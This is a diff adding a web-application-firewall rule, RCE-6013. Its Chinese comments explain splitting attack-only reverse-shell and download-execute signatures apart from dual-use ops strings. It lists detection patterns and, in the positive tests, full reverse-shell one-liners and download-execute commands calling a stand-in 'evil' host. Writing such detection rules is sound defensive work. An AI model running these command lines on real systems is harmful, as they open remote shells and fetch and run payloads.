@@ -556,6 +556,81 @@ rules:
         - "please load the configuration file"
         - "aGVsbG8gd29ybGQ="
 
+  # 这一条是**从 6004/6005 里"挑出来单独拦"的那部分**。
+  #
+  # 为什么拆：那两条把"攻击专用形态"和"运维文档里天天出现的双用途串"混在一起 ——
+  # `chmod 777`、`systemctl enable`、`authorized_keys`、`openssl s_client -connect`、
+  # `nc -lvp`、`python -c`、`ipconfig /all`、`tasklist /v` 这些出现在帮助台工单、
+  # 运维文档、配置表单里的概率很高。整条提到 5 分（单独就拦）等于拿误报换覆盖。
+  #
+  # 所以按"出现即攻击"来分：
+  #   - 这条（6013，5 分）：反弹 shell 与下载执行的**专用命令行形态**，
+  #     正常业务输入里不会出现，出现即拦；
+  #   - 6004/6005（4 分）：双用途形态，只记分、与其它信号叠加。
+  # 重叠的串两条都会命中（5 + 4），总分更高但拦不拦的结论不变。
+  - id: RCE-6013
+    phase: 2
+    severity: critical
+    category: rce
+    score: 5
+    message: "命令执行特征：反弹 shell / 下载执行专用形态"
+    tags: [rce, owasp-a03, reverse-shell, download-exec]
+    targets:
+      - collection: ARGS
+      - collection: REQUEST_BODY
+      - collection: REQUEST_HEADERS
+    transforms:
+      - urlDecode
+      - urlDecode
+      - replaceComments
+      - compressWhitespace
+      - lowercase
+      - normalizePath
+    operator:
+      name: pm
+      params:
+        patterns:
+          # 反弹 shell
+          - "/dev/tcp/"
+          - "bash -i >&"
+          - "sh -i >&"
+          - "nc -e /bin"
+          - "ncat -e /bin"
+          - "mkfifo /tmp"
+          - "socat tcp-connect"
+          - "socat exec:"
+          - "base64 -d | sh"
+          - "base64 --decode | sh"
+          # 下载执行（系统自带工具的滥用）
+          - "certutil -urlcache"
+          - "certutil -decode"
+          - "bitsadmin /transfer"
+          - "mshta http"
+          - "mshta javascript"
+          - "rundll32 javascript"
+          - "wmic process call create"
+          - "powershell -enc"
+          - "powershell -e "
+    test:
+      positive:
+        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        - "nc -e /bin/sh 10.0.0.1 4444"
+        - "mkfifo /tmp/f; /bin/sh -i < /tmp/f"
+        - "echo cHduZWQ= | base64 -d | sh"
+        - "certutil -urlcache -f http://evil/x.exe y.exe"
+        - "bitsadmin //transfer http://evil/x y.exe"
+        - "mshta http://evil/x.hta"
+        - "powershell -enc SQBFAFgA"
+        - "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh"
+      negative:
+        # 双用途的运维文本不该被这条拦（它们仍由 6004/6005 记分）
+        - "run chmod 777 on the uploads directory"
+        - "systemctl enable nginx after the upgrade"
+        - "append your key to ~/.ssh/authorized_keys"
+        - "openssl s_client -connect example.com:443"
+        - "python -c 'print(1)' in a venv"
+        - "ipconfig /all shows the adapter list"
+
   - id: RCE-6012
     phase: 2
     severity: high
